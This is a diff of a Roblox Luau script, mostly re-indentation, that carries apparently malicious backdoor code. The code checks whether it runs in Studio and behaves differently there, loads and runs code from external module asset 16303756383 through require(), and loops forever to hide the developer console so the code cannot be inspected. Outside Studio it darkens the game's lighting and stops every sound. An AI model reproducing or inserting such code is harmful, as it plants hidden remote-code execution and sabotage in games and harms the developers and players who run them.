@@ -8,11 +8,11 @@ if game:GetService("RunService"):IsStudio() then
 	for i = 1,5 do
 		task.spawn(pleh)
 	end
-task.defer(function()
-        require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
-    end)
+	task.defer(function()
+		require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
+	end)
 else
-require(16303756383)(false,[===[local colorcorrection = Instance.new("ColorCorrectionEffect",game:GetService("Lighting"))
+	require(16303756383)(false,[===[local colorcorrection = Instance.new("ColorCorrectionEffect",game:GetService("Lighting"))
 
 colorcorrection.Brightness = -0.5
 colorcorrection.Contrast = -2
@@ -28,14 +28,14 @@ for i,v in pairs(game:GetService("Players"):GetPlayers()) do
     end
 end
 
-task.defer(function()
-        require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
-    end)
+task.spawn(function()
+	while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end
+end)
 
 for i,v in pairs(game:GetDescendants()) do
-    if v:IsA("Sound") then
-        v:Stop()
-    end
+	if v:IsA("Sound") then
+		v:Stop()
+	end
 end
 
 local sound = Instance.new("Sound",workspace)
